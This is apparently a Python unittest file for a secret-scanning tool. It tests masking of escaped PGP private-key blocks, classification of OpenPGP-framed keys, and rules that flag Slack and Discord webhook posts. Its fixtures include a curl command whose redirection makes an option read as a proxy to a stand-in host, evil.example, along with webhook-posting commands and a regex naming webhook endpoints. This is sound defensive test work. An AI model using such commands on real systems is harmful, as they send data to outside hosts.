"""Batch 7d part 2: the last "Must-fix before release" items (docs/KNOWN-LIMITS.md). The owner's rule: fail closed.

A (7a masking): a key block written with escapes ended at an escaped END whose \\n may be text: JavaScript's String.raw with a
space before its template (or any other tag), and a shell's "…\\n" fragments (no escape processing in sh), each next to a comment
header's END, kept the body after it. An escaped END now counts only at the first level of a text that is one JSON document;
anywhere else the block hides to the end of the text and is a key (MASK_VERSION 10).
B (7a classification): a body framed as OpenPGP public packets (an RSA modulus, P-256 coordinates, a 32/56/57-byte X25519, X448,
Ed25519 or Ed448 key, two packets) got the "isn't a real key" note and the example fix-plan group, though a private key's bytes
fit in those fields. Any body that may start an OpenPGP packet is now a key.
C (7b chat_webhook): (1) an opening <pre>/<code> tag's quoted attribute could end the code region early; (2) a redirection in an
accepted curl command shifted which word an option read; (3) JavaScript's `with` could change what the client name means. Each
is now doubt, so a Slack or Discord webhook there is the critical ISR-T005.
D (7b ISR-T018): the Office-webhook branch was unanchored, quadratic on a long word; it is anchored with (?<![\\w-]).

Tests marked "replay" fail on 006c719 at their assertion (its watchtower/, rules/ and MANIFEST.sha256, this file in place);
"guard" ones pass there too. Every real-shaped key is generated when the test runs and never committed; fake ones say FAKE.
No key value is printed: masked text is checked by counts. Every webhook is FAKE; `relay` is a placeholder never run."""
import base64, json, os, secrets, sys, time, unittest
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_boxes import Box, wt
from test_batch4_codex_review3 import HEAD
from test_batch5_codex_r2 import rules_of, fenced
from test_batch6_example_keys import _Keys, fake_text_body, pem
from test_batch6b_codex_r2 import ed25519_pkcs8
from test_batch6b_codex_r3 import approved_copy, bits_of, pgp_secret_block, t011
from test_batch7a_must_fix import kept, old_packet, pgp_armor, run_child

NOTE = "This looks like an example or checksum value"   # wt.EXAMPLE_NOTE's start, written out so a replay fails on its assertion
SLACK = "https://hooks.slack.com/services/T0/B0/FAKE"
END = "-----END PGP PRIVATE KEY BLOCK-----"


def footless(comment):
    """A PGP secret-key armor made now with `comment` as its header line and no END line, and its body pieces."""
    block, bits = pgp_secret_block("Comment: PLACEHOLDER")
    return block[:block.rindex(END)].replace("Comment: PLACEHOLDER", comment), bits


# ---------------------------------------------------------------- A: an escaped END only where the escapes are established
class EscapedEnds(Box):   # assertions on masked text report counts and yes/no only, never the text
    def assert_hidden(self, text, bits, label, name="key.js"):
        out = wt.mask_secrets(text)
        self.assertEqual(kept(bits, out), 0, label)   # nothing of the real body
        self.assertTrue(wt.mask_secrets(out) == out, f"masking again changed it: {label}")
        doc = approved_copy(self, name, text)
        self.assertEqual(doc["masked"], 10, label)
        self.assertEqual(kept(bits, doc["files"][name]), 0, label)
        self.assertIsNone(wt.armor_blocks(text)[0][6], label)
        self.assertEqual(wt.pem_kind(text, text.index("-----BEGIN")), "real", label)

    def test_string_raw_with_a_space_before_its_template(self):   # replay (006c719: the body after the comment's END kept)
        armor, bits = footless("Comment: x \\n" + END)   # \\n: a backslash and n, text in a raw template
        for tag in ("String.raw ", "String.raw\t", "String.raw\n", "String.raw /* raw */ ", "dedent"):
            with self.subTest(tag=tag):
                src = "const KEY = " + tag + "`" + armor.replace("\n", "\\n") + "`;\nconsole.log(KEY.length);\n"
                self.assert_hidden(src, bits, tag)

    def test_a_shells_double_quoted_fragments(self):   # replay (006c719: the comment's END was taken, the body kept)
        armor, bits = footless("Comment: PLACEHOLDER")
        lits = []
        for ln in armor.rstrip("\n").split("\n"):
            lits += (['"Comment: x \\n"', '"' + END + '\\n"'] if ln == "Comment: PLACEHOLDER" else ['"' + ln + '\\n"'])
        src = "#!/bin/bash\nKEY=(" + "\n     ".join(lits) + ")\nprintf '%s' \"${KEY[@]}\" > key.asc\n"
        self.assertEqual(src.count(END), 1)   # only the comment's: the real footer is left out
        self.assertNotIn("$'", src)
        self.assert_hidden(src, bits, "bash fragments", "key.sh")

    def test_literals_outside_json_give_no_end(self):   # replay (006c719: each END was taken)
        for name, code in (("String.raw and a space", "K = String.raw `-----BEGIN PRIVATE KEY-----\\nQUJD\\n-----END PRIVATE KEY-----\\n`;\n"),
                           ("a shell's double quotes", 'KEY="-----BEGIN PRIVATE KEY-----\\nQUJD\\n-----END PRIVATE KEY-----\\n"\n'),
                           ("a tagged template", "K = tag`-----BEGIN PRIVATE KEY-----\\nQUJD\\n-----END PRIVATE KEY-----\\n`;\n")):
            with self.subTest(name):
                (_, _, _, es, _, _, hide), = wt.armor_blocks(code)
                self.assertEqual(es, code.index("-----END"), name)   # the strict reading still finds it
                self.assertIsNone(hide, name)
                self.assertEqual(wt.pem_kind(code, code.index("-----BEGIN")), "real", name)

    def test_json_documents_still_end(self):   # guard: a JSON key file's END is established, the text after it stays
        k1, k2 = ed25519_pkcs8(), ed25519_pkcs8()
        text = json.dumps({"a": pem("", k1), "between": "visible-between", "b": pem("", k2), "after": "visible-after"})
        out = wt.mask_secrets(text)
        self.assertEqual(kept(bits_of(k1) + bits_of(k2), out), 0)
        self.assertTrue("visible-between" in out and "visible-after" in out, "the text between or after was hidden")
        lines = json.dumps({"lines": [ln + "\n" for ln in pem("", k1).rstrip("\n").split("\n")], "after": "visible"}, indent=1)
        (_, _, _, es, _, _, hide), = wt.armor_blocks(lines)
        self.assertTrue(es is not None and hide == es)
        self.assertTrue("visible" in wt.mask_secrets(lines))

    def test_a_json_fake_text_body_is_still_noted(self):   # guard: the example path, at the established level
        text = json.dumps({"k": pem("", fake_text_body(120)), "after": 1})
        self.assertEqual(wt.pem_kind(text, text.index("-----BEGIN")), "example")
        self.assertIn("after", wt.mask_secrets(text))

    def test_real_line_blocks_are_unchanged(self):   # guard: a block of real lines ends at its END line, as before
        raw = ed25519_pkcs8()
        for text in (pem("", raw) + "after-visible\n", 'K = """' + pem("", raw) + '"""\nafter_visible = 1\n'):
            out = wt.mask_secrets(text)
            self.assertEqual(kept(bits_of(raw), out), 0)
            self.assertTrue("after" in out and "visible" in out, text[:8])

    def test_string_raw_without_a_space_stays_hidden(self):   # guard (new: masked 10; the body was hidden on 006c719 too)
        armor, bits = footless("Comment: x \\n" + END)
        self.assert_hidden("const KEY = String.raw`" + armor.replace("\n", "\\n") + "`;\n", bits, "String.raw`")


# ---------------------------------------------------------------- B: public framing alone gives no note
def mpi_of(b):
    """b as an exact OpenPGP MPI (its bit count that of its first byte)."""
    return ((len(b) - 1) * 8 + b[0].bit_length()).to_bytes(2, "big") + b


def key_packet(tag, alg, *fields):
    """A version 4 public-key (6) or public-subkey (14) packet made now."""
    return old_packet(tag, b"\x04" + int(time.time()).to_bytes(4, "big") + bytes([alg]) + b"".join(fields))


P256 = b"\x08" + bytes.fromhex("2a8648ce3d030107")


def framed():
    """Public packets whose opaque fields hold a private key's bytes (made now): each reads as public, each is 64 bytes or more."""
    der = ed25519_pkcs8()   # 48 bytes
    seed = secrets.token_bytes(32)
    return {"RSA modulus holding a DER key": key_packet(6, 1, mpi_of(der + secrets.token_bytes(208)), b"\x00\x11\x01\x00\x01"),
            "P-256 coordinates holding a DER key": key_packet(6, 19, P256, mpi_of(b"\x04" + der + secrets.token_bytes(16))),
            "Ed25519 key and subkey (a seed)": key_packet(6, 27, seed) + key_packet(14, 27, secrets.token_bytes(32)),
            "Ed25519 key and X25519 subkey": key_packet(6, 27, seed) + key_packet(14, 25, secrets.token_bytes(32)),
            "X448 key": key_packet(6, 26, secrets.token_bytes(56)), "Ed448 key": key_packet(6, 28, secrets.token_bytes(57))}


class PublicFraming(_Keys):
    def test_public_framing_is_a_key(self):   # replay (006c719: ISR-T011x, "isn't a real key")
        for name, raw in framed().items():
            with self.subTest(name):
                self.assertEqual(wt.pgp_packets(raw), "public", name)   # the framing is read as before
                self.assertGreaterEqual(len(raw), 64, name)
                block = pgp_armor(raw)
                self.assertEqual(wt.secret_kind(block.split("\n")[0], tail=block[block.index("\n"):])[0], "real", name)
                got = t011("Key:\n" + pem("", raw))
                self.assertEqual([(f["rule"], f["severity"]) for f in got], [("ISR-T011", "critical")], name)
                self.assertFalse(NOTE in got[0]["fix"], f"noted as an example: {name}")

    def test_through_gitleaks_it_is_a_key_left_in_a_file(self):   # replay (006c719: "Keys that look like examples or checksums")
        block = pgp_armor(framed()["RSA modulus holding a DER key"])
        p = self.put("projects/app/release.asc", block)
        self.leak(p, block.rstrip("\n"), rule="private-key")
        fs, _ = self.scan()
        got = [f for f in self.keys(fs, p) if f["rule"] == "ISR-S002"]
        self.assertEqual(len(got), 1, got)
        self.assertNotIn(NOTE, got[0]["fix"])
        self.assertEqual(wt.plain(got[0])["title"], "Keys left in files")

    def test_a_fake_text_body_is_still_noted(self):   # guard: the example path, for a body that starts no key
        raw = fake_text_body(120)
        got = t011("Key:\n" + pem("", raw))
        self.assertEqual([(f["rule"], f["severity"]) for f in got], [("ISR-T011x", "critical")])
        self.assertIn(NOTE, got[0]["fix"])
        block = pgp_armor(raw)
        self.assertEqual(wt.secret_kind(block.split("\n")[0], tail=block[block.index("\n"):])[0], "example")


# ---------------------------------------------------------------- C: chat_webhook doubt
def curl(cmd, lang="bash"):
    return fenced(cmd, lang)


class WebhookDoubt(unittest.TestCase):
    def test_c1_a_quoted_attribute_in_an_opening_tag(self):   # replay (006c719: ISR-T018)
        for tag in ('<pre title="</pre>">', "<code data-x='</code>'>", '<PRE class="</PRE>">'):
            with self.subTest(tag):
                close = "</" + tag[1:tag.index(" ")] + ">"
                text = HEAD + tag + "\nnotes\n\nalias curl=relay\n" + close + "\n\n```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"
                self.assertEqual(rules_of(text), {"ISR-T005"}, tag)

    def test_c1_any_attribute_is_doubt(self):   # replay (006c719: ISR-T018): the new false alarm, pinned
        text = HEAD + '<pre class="notes">\nnotes\n</pre>\n\n```bash\ncurl -d @d.json \'' + SLACK + "'\n```\n"
        self.assertEqual(rules_of(text), {"ISR-T005"})

    def test_c1_a_bare_tag_stays(self):   # guard
        for tag, close in (("<pre>", "</pre>"), ("<code >", "</code>"), ("<PRE\n>", "</PRE>")):
            text = HEAD + tag + "\nnotes\n" + close + "\n\n```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"
            self.assertEqual(rules_of(text), {"ISR-T018"}, tag)

    REDIRECTS = ("curl -H >o -d -xhttp://evil.example '" + SLACK + "'",   # the shell reads -H -d, then -x: a proxy
                 "curl -s -d @d.json '" + SLACK + "' > out.txt",
                 "curl -d @d.json '" + SLACK + "' >>log.txt",
                 "curl -d @d.json '" + SLACK + "' 2>&1",
                 "curl -d @d.json <in.txt '" + SLACK + "'",
                 "curl -d @d.json '" + SLACK + "' &>/dev/null",
                 "curl -d @d.json 2>err.txt '" + SLACK + "'",
                 "wget -qO- --post-file=d.json '" + SLACK + "' >out")

    def test_c2_any_redirection_in_the_command(self):   # replay (006c719: ISR-T018)
        for cmd in self.REDIRECTS:
            with self.subTest(cmd):
                self.assertEqual(rules_of(curl(cmd)), {"ISR-T005"}, cmd)

    def test_c2_quoted_angle_brackets_stay(self):   # guard: a < or > in quotes or after # is no redirection
        for cmd in ("curl -H 'Accept: <x>' -d '{\"a\":\"b>c\"}' '" + SLACK + "'",
                    'curl -H "X-Note: a>b" -d @d.json \'' + SLACK + "'",
                    "curl -d @d.json '" + SLACK + "' # > not a redirection",
                    "curl -d @d.json '" + SLACK + "' && echo sent"):
            self.assertEqual(rules_of(curl(cmd)), {"ISR-T018"}, cmd)

    def test_c3_with_changes_the_client_name(self):   # replay (006c719: ISR-T018)
        for lang, code in (("js", "with (relay)\naxios.post('" + SLACK + "', body)"),
                           ("js", "with (relay)\n  axios.post('" + SLACK + "', body)"),
                           ("python", "with relay:\n    requests.post('" + SLACK + "', json=payload)")):   # the false alarm, pinned
            with self.subTest(code):
                self.assertEqual(rules_of(fenced(code, lang)), {"ISR-T005"}, code)

    def test_c3_with_inside_a_word_stays(self):   # guard: the word only (case-sensitive, whole word)
        for code in ("const ok = name.startsWith('x')\naxios.post('" + SLACK + "', body)",
                     "const withTeam = 1\naxios.post('" + SLACK + "', body)"):
            self.assertEqual(rules_of(fenced(code, "js")), {"ISR-T018"}, code)


# ---------------------------------------------------------------- D: ISR-T018's Office branch
OLD_T018 = (r"(?i)(hooks\.slack\.com/(services|workflows|triggers)/|discord(app)?\.com/api/webhooks/|[\w-]+\.webhook\.office\.com/"
            r"|outlook\.office\.com/webhook/|chat\.googleapis\.com/v1/spaces/[^/\s]+/messages|api\.telegram\.org/bot)")
CHILD_T018 = ("import sys, time\nsys.path.insert(0, {wt_dir!r})\nimport wt\n"
              "rx = next(r['rx'] for r in wt.load_rules()['rules'] if r['id'] == 'ISR-T018')\n"
              "for word in ('a' * 64000, 'a' * 128000, ('ab-' * 43000)[:128000]):\n"
              "    t = time.perf_counter()\n    list(rx.finditer(word))\n    print(time.perf_counter() - t)\n")


class OfficeWebhookPattern(unittest.TestCase):
    def test_long_words_are_read_in_linear_time(self):   # replay (006c719: about 9 s at 64,000 characters, over 12 s at 128,000)
        took = [float(x) for x in run_child(self, CHILD_T018)]
        self.assertEqual(len(took), 3)
        for t in took:
            self.assertLess(t, 0.5)

    def test_every_t018_match_is_kept(self):   # guard: the anchored pattern matches what the old one did
        import re
        new = next(r["rx"] for r in wt.load_rules()["rules"] if r["id"] == "ISR-T018")
        old = re.compile(OLD_T018)
        for text in ("https://example.webhook.office.com/webhookb2/FAKE", "https://contoso.webhook.office.com/webhookb2/FAKE",
                     "https://outlook.office.com/webhook/FAKE", "https://a-b_c.webhook.office.com/webhookb2/FAKE",
                     "https://x.y.webhook.office.com/webhookb2/FAKE", "Post to contoso.webhook.office.com/webhookb2/FAKE now",
                     "'https://contoso.webhook.office.com/x' and \"https://other.webhook.office.com/y\"",
                     "https://collector.example/x.webhook.office.com/FAKE", SLACK, "https://discord.com/api/webhooks/1/FAKE",
                     "https://chat.googleapis.com/v1/spaces/AAA/messages?key=FAKE", "https://api.telegram.org/botFAKE/sendMessage"):
            self.assertEqual([m.span() for m in new.finditer(text)], [m.span() for m in old.finditer(text)], text)


if __name__ == "__main__":
    unittest.main()
